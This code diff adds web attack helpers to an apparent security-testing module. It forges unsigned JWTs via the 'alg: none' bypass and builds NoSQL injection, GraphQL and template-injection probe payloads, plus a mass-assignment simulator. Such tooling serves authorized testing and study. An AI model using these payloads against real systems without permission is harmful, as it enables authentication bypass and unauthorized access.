@@ -97,3 +97,47 @@ def format_cookies(cookies: dict[str, str]) -> str:
 def build_nosql_query_payload(field: str, operator: str = "$ne", value: object = "") -> dict[str, object]:
     """Build a MongoDB/NoSQL operator injection payload dictionary."""
     return {field: {operator: value}}
+
+
+def jwt_forge_alg_none(payload: dict[str, object], header: dict[str, object] | None = None) -> str:
+    """Forge an unverified JWT using the 'none' algorithm bypass."""
+    if header is None:
+        header = {"alg": "none", "typ": "JWT"}
+    h_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
+    p_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
+    return f"{h_b64}.{p_b64}."
+
+
+def build_graphql_query(field_name: str, subfields: list[str] | None = None) -> dict[str, str]:
+    """Construct a GraphQL JSON query payload."""
+    if subfields:
+        fields_str = " ".join(subfields)
+        query = f"query {{ {field_name} {{ {fields_str} }} }}"
+    else:
+        query = f"query {{ {field_name} }}"
+    return {"query": query}
+
+
+def build_ssti_probes() -> dict[str, str]:
+    """Return common template injection mathematical evaluation probes."""
+    return {
+        "jinja2": "{{7*7}}",
+        "twig": "{{7*7}}",
+        "smarty": "{7*7}",
+        "erb": "<%= 7*7 %>",
+        "spring_el": "${7*7}",
+    }
+
+
+def merge_mass_assignment(
+    base: dict[str, object],
+    overrides: dict[str, object],
+    allowed_keys: set[str] | None = None,
+) -> dict[str, object]:
+    """Simulate mass assignment with optional whitelist protection."""
+    result = dict(base)
+    for k, v in overrides.items():
+        if allowed_keys is None or k in allowed_keys:
+            result[k] = v
+    return result
+
